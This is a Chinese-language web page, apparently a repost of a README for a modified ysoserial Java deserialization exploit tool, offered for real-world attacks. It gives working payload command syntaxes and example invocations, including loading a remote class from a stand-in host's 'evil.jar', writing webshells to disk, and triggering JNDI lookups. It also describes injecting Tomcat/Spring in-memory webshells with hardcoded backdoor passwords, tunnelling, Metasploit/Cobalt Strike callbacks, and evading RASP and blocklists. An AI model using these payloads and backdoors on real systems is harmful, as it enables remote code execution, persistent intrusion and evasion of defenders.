<span class="hljs-title class_">JavassistWeld1</span>           <span class="hljs-variable">@matthias_kaiser</span>                       <span class="hljs-symbol">javassist:</span><span class="hljs-number">3.12</span>.<span class="hljs-number">1</span>.<span class="hljs-variable constant_">GA</span>, weld-<span class="hljs-symbol">core:</span><span class="hljs-number">1.1</span>.<span class="hljs-number">33</span>.<span class="hljs-title class_">Final</span>, cdi-<span class="hljs-symbol">api:</span><span class="hljs-number">1.0</span>-<span class="hljs-variable constant_">SP1</span>, javax.interceptor-<span class="hljs-symbol">api:</span><span class="hljs-number">3.1</span>, jboss-interceptor-<span class="hljs-symbol">spi:</span><span class="hljs-number">2.0</span>.<span class="hljs-number">0</span>.<span class="hljs-title class_">Final</span>, slf4j-<span class="hljs-symbol">api:</span><span class="hljs-number">1.7</span>.<span class="hljs-number">21</span>                                                        <br>     <span class="hljs-title class_">Jdk7u21</span>                  <span class="hljs-variable">@frohoff</span>                                                                                                                                                                                                                                   <br>     <span class="hljs-title class_">Jython1</span>                  <span class="hljs-variable">@pwntester</span>, <span class="hljs-variable">@cschneider4711</span>            jython-<span class="hljs-symbol">standalone:</span><span class="hljs-number">2.5</span>.<span class="hljs-number">2</span>                                                                                                                                                                             <br>     <span class="hljs-title class_">MozillaRhino1</span>            <span class="hljs-variable">@matthias_kaiser</span>                       <span class="hljs-symbol">js:</span><span class="hljs-number">1</span>.7R2                                                                                                                                                                                            <br>     <span class="hljs-title class_">MozillaRhino2</span>            <span class="hljs-variable">@_tint0</span>                                <span class="hljs-symbol">js:</span><span class="hljs-number">1</span>.7R2                                                                                                                                                                                            <br>     <span class="hljs-title class_">Myfaces1</span>                 <span class="hljs-variable">@mbechler</span>                                                                                                                                                                                                                                  <br>     <span class="hljs-title class_">Myfaces2</span>                 <span class="hljs-variable">@mbechler</span>                                                                                                                                                                                                                                  <br>     <span class="hljs-variable constant_">ROME</span>                     <span class="hljs-variable">@mbechler</span>                              <span class="hljs-symbol">rome:</span><span class="hljs-number">1.0</span>                                                                                                                                                                                            <br>     <span class="hljs-title class_">Spring1</span>                  <span class="hljs-variable">@frohoff</span>                               spring-<span class="hljs-symbol">core:</span><span class="hljs-number">4.1</span>.<span class="hljs-number">4</span>.<span class="hljs-variable constant_">RELEASE</span>, spring-<span class="hljs-symbol">beans:</span><span class="hljs-number">4.1</span>.<span class="hljs-number">4</span>.<span class="hljs-variable constant_">RELEASE</span>                                                                                                                                               <br>     <span class="hljs-title class_">Spring2</span>                  <span class="hljs-variable">@mbechler</span>                              spring-<span class="hljs-symbol">core:</span><span class="hljs-number">4.1</span>.<span class="hljs-number">4</span>.<span class="hljs-variable constant_">RELEASE</span>, spring-<span class="hljs-symbol">aop:</span><span class="hljs-number">4.1</span>.<span class="hljs-number">4</span>.<span class="hljs-variable constant_">RELEASE</span>, <span class="hljs-symbol">aopalliance:</span><span class="hljs-number">1.0</span>, commons-<span class="hljs-symbol">logging:</span><span class="hljs-number">1.2</span>                                                                                                           <br>     <span class="hljs-title class_">Spring3</span>                                                         spring-<span class="hljs-symbol">tx:</span><span class="hljs-number">5.2</span>.<span class="hljs-number">3</span>.<span class="hljs-variable constant_">RELEASE</span>, spring-<span class="hljs-symbol">context:</span><span class="hljs-number">5.2</span>.<span class="hljs-number">3</span>.<span class="hljs-variable constant_">RELEASE</span>, javax.transaction-<span class="hljs-symbol">api:</span><span class="hljs-number">1.2</span>                                                                                                                    <br>     <span class="hljs-variable constant_">URLDNS</span>                   <span class="hljs-variable">@gebl</span>                                                                                                                                                                                                                                      <br>     <span class="hljs-title class_">Vaadin1</span>                  <span class="hljs-variable">@kai_ullrich</span>                           vaadin-<span class="hljs-symbol">server:</span><span class="hljs-number">7.7</span>.<span class="hljs-number">14</span>, vaadin-<span class="hljs-symbol">shared:</span><span class="hljs-number">7.7</span>.<span class="hljs-number">14</span>                                                                                                                                                          <br>     <span class="hljs-title class_">Wicket1</span>                  <span class="hljs-variable">@jacob</span>-baines                          wicket-<span class="hljs-symbol">util:</span><span class="hljs-number">6.23</span>.<span class="hljs-number">0</span>, slf4j-<span class="hljs-symbol">api:</span><span class="hljs-number">1.6</span>.<span class="hljs-number">4</span>  <br></code></pre></td></tr></table></figure>
+
+<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址:"></a>项目地址:</h2><p>GitHub:<br><a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial/">https://github.com/su18/ysoserial/</a></p>
+<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>在原版的利用方式中，对于使用 TemplatesImpl 的利用方式，仅使用了单一的 <code>java.lang.Runtime.getRuntime().exec()</code> 执行任意命令；对于使用 ChainedTransformer 的利用方式，也是仅 chain 了一个 Runtime exec，再漏洞利用上过于局限且单一，因此本项目在原版项目基础上扩展了不同的利用方式以供在实战环境中根据情况选择。</p>
+<h2 id="针对-ChainedTransformer"><a href="#针对-ChainedTransformer" class="headerlink" title="针对 ChainedTransformer"></a><a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial/#%E9%92%88%E5%AF%B9-chainedtransformer"></a>针对 ChainedTransformer</h2><p>对于本项目中的 CommonsCollections1、CommonsCollections5、CommonsCollections6、CommonsCollections6Lite、CommonsCollections7、CommonsCollections9，均为使用了 ChainedTransformer 进行链式反射调用的利用方式，针对 CC 3.1-3.2.1 的依赖。</p>
+<p>本项目为其拓展了除了 Runtime 执行命令意外的多种利用方式，具体如下：</p>
+<ul>
+<li>TS ：Thread Sleep – 通过 <code>Thread.sleep()</code> 的方式来检查是否存在反序列化漏洞，使用命令：<code>TS-10</code></li>
+<li>RC ：Remote Call – 通过 <code>URLClassLoader.loadClass()</code> 来调用远程恶意类并初始化，使用命令：<code>RC-http://xxxx.com/evil.jar#EvilClass</code></li>
+<li>WF ：Write File – 通过 <code>FileOutputStream.write()</code> 来写入文件，使用命令：<code>WF-/tmp/shell#d2hvYW1p</code></li>
+<li>PB ：ProcessBuilder 通过 <code>ProcessBuilder.start()</code> 来执行系统命令，使用命令 <code>PB-lin-d2hvYW1p</code> &#x2F; <code>PB-win-d2hvYW1p</code> 分别在不同操作系统执行命令</li>
+<li>SE ：ScriptEngine – 通过 <code>ScriptEngineManager.getEngineByName(&#39;js&#39;).eval()</code> 来解析 JS 代码调用 Runtime 执行命令，使用命令 <code>SE-d2hvYW1</code></li>
+<li>DL ：DNS LOG – 通过 <code>InetAddress.getAllByName()</code> 来触发 DNS 解析，使用命令 <code>DL-xxxdnslog.cn</code></li>
+<li>HL ：HTTP LOG – 通过 <code>URL.getContent()</code> 来触发 HTTP LOG，使用命令 <code>HL-http://xxx.com</code></li>
+<li>BC ：BCEL Classloader – 通过 <code>..bcel...ClassLoader.loadClass().newInstance()</code> 来加载 BCEL 类字节码，使用命令 <code>BC-$BCEL$xxx</code></li>
+<li>JD ：JNDI Lookup – 通过 <code>InitialContext.lookup()</code> 来触发 JNDI 注入，使用命令 <code>JD-ldap://xxx/xx</code></li>
+<li>其他：普通命令执行 – 通过 <code>Runtime.getRuntime().exec()</code> 执行系统命令，使用命令 <code>whoami</code></li>
+</ul>
+<p>目前只针对 CC 3.1-3.2.1 使用了 ChainedTransformer，对于 CC 4.0 还是使用了 TemplatesImpl 的传统利用方式。</p>
+<p>这里需要注意的是，使用 PB 执行系统命令、WF 写入文件的内容、SE 执行命令时，为了防止传参错误，需要对传入的命令使用 base64 编码。</p>
+<p><strong>命令执行示例</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">java -jar ysuserial-<span class="hljs-number">0.1</span>-su18-<span class="hljs-built_in">all</span>.jar CommonsCollections1 PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==<br></code></pre></td></tr></table></figure>
+
+<p>效果图：</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/1-71-scaled.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/1-71-scaled.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/1-71-scaled.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<p><strong>DNSLOG示例</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">java -jar ysuserial-<span class="hljs-number">0.1</span>-su18-<span class="hljs-built_in">all</span>.jar CommonsCollections1 <span class="hljs-string">&#x27;DL-xxx.org&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>效果图：</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/2-58-scaled.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/2-58-scaled.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/2-58-scaled.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<p><strong>脚本引擎解析 JS 代码示例</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">java -jar ysuserial-<span class="hljs-number">0.1</span>-su18-<span class="hljs-built_in">all</span>.jar CommonsCollections1 <span class="hljs-string">&#x27;SE-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>效果图：</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/3-49-scaled.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/3-49-scaled.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/3-49-scaled.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<p><strong>文件写入示例</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">java -jar ysuserial-<span class="hljs-number">0.1</span>-su18-<span class="hljs-built_in">all</span>.jar CommonsCollections1 <span class="hljs-string">&#x27;WF-/tmp/1.jsp#PCVAcGFnZSBwYWdlR.....&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>效果图：</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/4-45-scaled.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/4-45-scaled.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/4-45-scaled.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<p><strong>触发 JNDI 查询注入示例</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">java -jar ysuserial-<span class="hljs-number">0.1</span>-su18-<span class="hljs-built_in">all</span>.jar CommonsCollections1 <span class="hljs-string">&#x27;JD-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>效果图：</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/5-42-scaled.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/5-42-scaled.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/5-42-scaled.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<p><strong>普通命令执行示例</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">java -jar ysuserial-<span class="hljs-number">0.1</span>-su18-<span class="hljs-built_in">all</span>.jar CommonsCollections1 <span class="hljs-string">&#x27;open -a Calculator.app&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>效果图：</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/6-38-scaled.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/6-38-scaled.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/6-38-scaled.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<h2 id="针对-TemplatesImpl"><a href="#针对-TemplatesImpl" class="headerlink" title="针对 TemplatesImpl"></a>针对 TemplatesImpl</h2><p>针对本项目中的 Click1、CommonsBeanutils1、CommonsBeanutils2、CommonsBeanutils1183NOCC、CommonsBeanutils2183NOCC、CommonsCollections2、CommonsCollections3、CommonsCollections4、CommonsCollections8、Hibernate1、JavassistWeld1、JBossInterceptors1、Jdk7u21、JRE8u20、JSON1、MozillaRhino1、MozillaRhino2、ROME、Spring1、Spring2、Vaadin1，均为使用 TemplatesImpl 加载恶意的类字节码的利用方式，原版仅使用了 Runtime 的命令执行方式，这里对其进行深度的扩展，并植入了多种内存马的功能。</p>
+<h3 id="扩展攻击-内存马及回显"><a href="#扩展攻击-内存马及回显" class="headerlink" title="扩展攻击-内存马及回显"></a><a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial/#%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB-%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8A%E5%9B%9E%E6%98%BE"></a>扩展攻击-内存马及回显</h3><p>如果使用这些利用链进行攻击，本项目内置了一些高级扩展用法，命令均使用 <code>EX-</code> 开头，具体如下：</p>
+<ul>
+<li>命令 <code>EX-SpringInterceptorMS</code>：向系统内植入 Spring 拦截器类型的内存马</li>
+<li>命令 <code>EX-TFMSFromJMX</code>：利用 JMX MBeans 向系统内植入 Tomcat Filter 型内存马</li>
+<li>命令 <code>EX-TFMSFromThread</code>：通过线程类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马</li>
+<li>命令 <code>EX-TLMSFromThread</code>：通过线程类加载器获取指定上下文向系统内植入 Tomcat Listener 型内存马</li>
+<li>命令 <code>EX-TLNeoRegFromThread</code>：通过线程类加载器获取指定上下文向系统内植入 NeoReg 流量隧道型内存马</li>
+<li>命令 <code>EX-TomcatEcho</code>：通过在线程中遍历获取当前 request 来执行命令并回显</li>
+<li>命令 <code>EX-TSMSFromJMX</code>：利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马</li>
+<li>命令 <code>EX-TSMSFromThread</code>：通过线程类加载器获取指定上下文系统内植入 Tomcat Servlet 型内存马</li>
+</ul>
+<p>这里就不一一测试截图了，欢迎大家进行测试，如果问题请按文档最后的联系方式联系我。</p>
+<h3 id="任意自定义代码"><a href="#任意自定义代码" class="headerlink" title="任意自定义代码"></a><a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial/#%E4%BB%BB%E6%84%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BB%A3%E7%A0%81"></a>任意自定义代码</h3><p>如果你不想使用本项目中提供的恶意逻辑，也不想执行命令，可以通过自定义代码的形式，自定义代码将会在目标服务器通过 ClassLoader 进行加载并实例化。命令使用 <code>LF-</code> 开头，后面跟指定自定义类字节码文件的绝对路径。</p>
+<p>示例：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">java -jar ysuserial-<span class="hljs-number">0.1</span>-su18-all.<span class="hljs-property">jar</span> <span class="hljs-title class_">CommonsCollections3</span> <span class="hljs-variable constant_">LF</span>-<span class="hljs-regexp">/tmp/</span>evil.<span class="hljs-property">class</span><br></code></pre></td></tr></table></figure>
+
+<p>效果图：</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/7-35-scaled.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/7-35-scaled.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/7-35-scaled.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<h3 id="普通命令执行"><a href="#普通命令执行" class="headerlink" title="普通命令执行"></a>普通命令执行</h3><p>最后是普通的执行命令，直接输入待执行的命令即可，程序将会使用 Unsafe 反射调用 forkAndExec 执行系统命令。</p>
+<p><strong>普通命令执行示例</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">java -jar ysuserial-<span class="hljs-number">0.1</span>-su18-<span class="hljs-built_in">all</span>.jar CommonsBeanutils2 <span class="hljs-string">&#x27;open -a Calculator.app&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>效果图：</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/8-34-scaled.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/8-34-scaled.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/8-34-scaled.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<h2 id="URLDNS-探测目标类"><a href="#URLDNS-探测目标类" class="headerlink" title="URLDNS 探测目标类"></a>URLDNS 探测目标类</h2><p>为了解决有反序列化利用点但是无链可用的状态，本项目提供了基于 URLDNS 探测目标类的功能。这条链会根据目标环境中不同的类是否存在来判断系统环境、依赖版本，主要包含如下表格中的内容：</p>
+<table>
+<thead>
+<tr>
+<th>DNSLOG 关键字</th>
+<th>对应链</th>
+<th>关键类</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>cc31or321  <br>cc322</td>
+<td>CommonsCollections13567</td>
+<td>org.apache.commons.collections.functors.ChainedTransformer  <br>org.apache.commons.collections.ExtendedProperties$1</td>
+<td>CommonsCollections1&#x2F;3&#x2F;5&#x2F;6&#x2F;7  <br>需要&lt;&#x3D;3.2.1版本</td>
+</tr>
+<tr>
+<td>cc40  <br>cc41</td>
+<td>CommonsCollections24</td>
+<td>org.apache.commons.collections4.functors.ChainedTransformer  <br>org.apache.commons.collections4.FluentIterable</td>
+<td>CommonsCollections2&#x2F;4链  <br>需要4-4.0版本</td>
+</tr>
+<tr>
+<td>cb17  <br>cb18x  <br>cb19x</td>
+<td>CommonsBeanutils2</td>
+<td>org.apache.commons.beanutils.MappedPropertyDescriptor$1  <br>org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry  <br>org.apache.commons.beanutils.BeanIntrospectionData</td>
+<td>1.7x-1.8x为-3490850999041592962  <br>1.9x为-2044202215314119608</td>
+</tr>
+<tr>
+<td>c3p092x  <br>c3p095x</td>
+<td>C3P0</td>
+<td>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase  <br>com.mchange.v2.c3p0.test.AlwaysFailDataSource</td>
+<td>0.9.2pre2-0.9.5pre8为7387108436934414104  <br>0.9.5pre9-0.9.5.5为7387108436934414104</td>
+</tr>
+<tr>
+<td>ajw</td>
+<td>AspectJWeaver</td>
+<td>org.aspectj.weaver.tools.cache.SimpleCache</td>
+<td>AspectJWeaver,需要cc31</td>
+</tr>
+<tr>
+<td>bsh20b4  <br>bsh20b5  <br>bsh20b6</td>
+<td>bsh</td>
+<td>bsh.CollectionManager$1  <br>bsh.engine.BshScriptEngine  <br>bsh.collection.CollectionIterator$1</td>
+<td>2.0b4为4949939576606791809  <br>2.0b5为4041428789013517368  <br>2.0.b6无法反序列化</td>
+</tr>
+<tr>
+<td>groovy1702311  <br>groovy24x  <br>groovy244</td>
+<td>Groovy</td>
+<td>org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet  <br>groovy.lang.Tuple2  <br>org.codehaus.groovy.runtime.dgm$1170</td>
+<td>2.4.x为-8137949907733646644  <br>2.3.x为1228988487386910280</td>
+</tr>
+<tr>
+<td>becl</td>
+<td>Becl</td>
+<td>com.sun.org.apache.bcel.internal.util.ClassLoader</td>
+<td>JDK&lt;8u251</td>
+</tr>
+<tr>
+<td>Jdk7u21</td>
+<td>Jdk7u21</td>
+<td>com.sun.corba.se.impl.orbutil.ORBClassLoader</td>
+<td>JDK&lt;&#x3D;7u21</td>
+</tr>
+<tr>
+<td>JRE8u20</td>
+<td>JRE8u20</td>
+<td>javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1</td>
+<td>7u25&lt;&#x3D;JDK&lt;&#x3D;8u20  <br>这个检测不完美,8u25版本以及JDK&lt;&#x3D;7u21会误报  <br>可综合Jdk7u21来看</td>
+</tr>
+<tr>
+<td>linux  <br>windows</td>
+<td>winlinux</td>
+<td>sun.awt.X11.AwtGraphicsConfigData  <br>sun.awt.windows.WButtonPeer</td>
+<td>windows&#x2F;linux版本判断</td>
+</tr>
+<tr>
+<td></td>
+<td>all</td>
+<td></td>
+<td>全部检测</td>
+</tr>
+</tbody></table>
+<p>示例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">java -jar ysuserial-<span class="hljs-number">0.1</span>-su18-<span class="hljs-built_in">all</span>.jar URLDNS <span class="hljs-string">&#x27;xxxxxx.dns.log&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>效果图：</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/9-34-scaled.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/9-34-scaled.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/9-34-scaled.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<h2 id="其他利用链的拓展"><a href="#其他利用链的拓展" class="headerlink" title="其他利用链的拓展"></a>其他利用链的拓展</h2><p>对于 BeanShell1 及 Clojure 这两个基于脚本语言解析的漏利用方式。</p>
+<p>本项目为这两条利用链拓展了除了 Runtime 执行命令意外的多种利用方式，具体如下：</p>
+<ul>
+<li>TS ：Thread Sleep – 通过 <code>Thread.sleep()</code> 的方式来检查是否存在反序列化漏洞，使用命令：<code>TS-10</code></li>
+<li>RC ：Remote Call – 通过 <code>URLClassLoader.loadClass()</code> 来调用远程恶意类并初始化，使用命令：<code>RC-http://xxxx.com/evil.jar#EvilClass</code></li>
+<li>WF ：Write File – 通过 <code>FileOutputStream.write()</code> 来写入文件，使用命令：<code>WF-/tmp/shell#123</code></li>
+<li>其他：普通命令执行 – 通过 <code>ProcessBuilder().start()</code> 执行系统命令，使用命令 <code>whoami</code></li>
+</ul>
+<p>与之前的扩展类似，这里也不放截图了。</p>
+<h2 id="MSF-x2F-CS-上线"><a href="#MSF-x2F-CS-上线" class="headerlink" title="MSF&#x2F;CS 上线"></a><a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial/#msfcs-%E4%B8%8A%E7%BA%BF"></a>MSF&#x2F;CS 上线</h2><p>使用 MSF 的上线载荷配合远程 Jar 包调用完成 MSF 上线，后续可转 CS。</p>
+<p><strong>示例</strong>：</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/10-32-scaled.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/10-32-scaled.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/10-32-scaled.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<h1 id="内存马的使用"><a href="#内存马的使用" class="headerlink" title="内存马的使用"></a>内存马的使用</h1><p>针对项目中一键打入的各种内存马，这里提供了通用的利用方式。</p>
+<h2 id="命令执行及后门类"><a href="#命令执行及后门类" class="headerlink" title="命令执行及后门类"></a><a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial/#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8A%E5%90%8E%E9%97%A8%E7%B1%BB"></a>命令执行及后门类</h2><p>对于 SpringInterceptorMS、TFMSFromJMX、TFMSFromThread、TLMSFromJMX、TLMSFromThread、TSMSFromJMX、TSMSFromThread 注入内存马的利用方式，此类内存马都同时集成了三种功能：命令执行及回显、冰蝎、哥斯拉。</p>
+<p>首先为了隐藏内存马，通过逻辑进行了判断，需要在请求 Header 中添加 <code>Referer: https://su18.org/</code>。</p>
+<p>其次将根据 header 中的 <code>X-SSRF-TOKEN</code> 的值执行不同的逻辑：</p>
+<ol>
+<li>如果 <code>X-SSRF-TOKEN</code> 的值是 ce，则为 命令执行 功能，程序会从 <code>X-Token-Data</code> 中读取待执行的命令，并将执行结果进行回显；</li>
+</ol>
+<p> </p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/11-25-scaled.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/11-25-scaled.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/11-25-scaled.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<p>2.如果 <code>X-SSRF-TOKEN</code> 的值是 bx，则为 冰蝎 Shell 功能，可使用冰蝎客户端进行连接管理，密码 <code>su18yyds</code>；</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/12-24-scaled.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/12-24-scaled.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/12-24-scaled.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<p>3.如果 <code>X-SSRF-TOKEN</code> 的值是 gz，则为 哥斯拉 shell 功能，可使用哥斯拉客户端进行连接管理，pass 值设为 <code>su18</code>，key 设为 <code>su18yyds</code>。</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/13-24-scaled.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/13-24-scaled.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/13-24-scaled.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<h2 id="NeoReg-隧道类"><a href="#NeoReg-隧道类" class="headerlink" title="NeoReg 隧道类"></a>NeoReg 隧道类</h2><p>对于 TLNeoRegFromThread 注入 NeoReg 的隧道脚本。项目地址：<a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
+<p>可以使用类似如下命令建立隧道连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python neoreg.py -k su18 -u http://xxx.com/ -H <span class="hljs-string">&#x27;Referer: https://su18.org/&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>效果图:</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/14-21-scaled.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/14-21-scaled.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/14-21-scaled.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<h2 id="TomcatEcho"><a href="#TomcatEcho" class="headerlink" title="TomcatEcho"></a>TomcatEcho</h2><p>对于 TomcatEcho 是基于在线程组中找到带有指定 Header 头部的请求、执行命令并回显的利用方式。</p>
+<p>使用时在 Header 中加入 <code>X-Token-Data</code> ，其值为待执行的命令，命令执行结果将回显在 response 中。</p>
+<p>效果图：</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/15-21.webp"></a><a target="_blank" rel="noopener" href="https://www.ddosi.org/wp-content/uploads/2022/06/15-21.webp"><img src="https://www.ddosi.org/wp-content/uploads/2022/06/15-21.webp" srcset="/img/loading.gif" lazyload alt="ysuserial Java反序列化漏洞验证利用工具"></a></p>
+<h1 id="防御的绕过"><a href="#防御的绕过" class="headerlink" title="防御的绕过"></a>防御的绕过</h1><p>这部分不涉及使用方式，只是简单的描述一下项目中所使用的绕过方式供大家了解。</p>
+<h2 id="流量层面"><a href="#流量层面" class="headerlink" title="流量层面"></a><a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial/#%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2"></a>流量层面</h2><p>对于冰蝎和哥斯拉，他们自己在流量和Java层都有很多可以提取的特征，这里没有办法去管控，需要各位自行去魔改，其实也并不难。本项目把一些大家实现的比较类似的一些特征进行了去除。</p>
+<h2 id="RASP-层面"><a href="#RASP-层面" class="headerlink" title="RASP 层面"></a><a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial/#rasp-%E5%B1%82%E9%9D%A2"></a>RASP 层面</h2><p>对于漏洞执行常使用的 Runtime、URLClassLoader 等，很多 RASP 都进行了 Hook，在攻击时可能会被拦截，这里我使用了一些反射调用 native 方法之类的技术去尝试 RASP 的防御，具体的技术实现就不细说了，感兴趣的朋友可以反编译 jar 包查看相关代码。</p>
+<p>这里由于发现还有的不讲武德的防御方式在类加载时进行包名的黑名单的匹配，对例如 rebeyond&#x2F;metasploit 之类的关键字进行了防御，因此本项目只用了个人的域名前缀包名 <code>org.su18</code>，据我了解目前还没有人针对我这个包名进行防御，如果未来被加入了豪华黑名单大礼包，我会更新可以生成自定义包名的版本。</p>
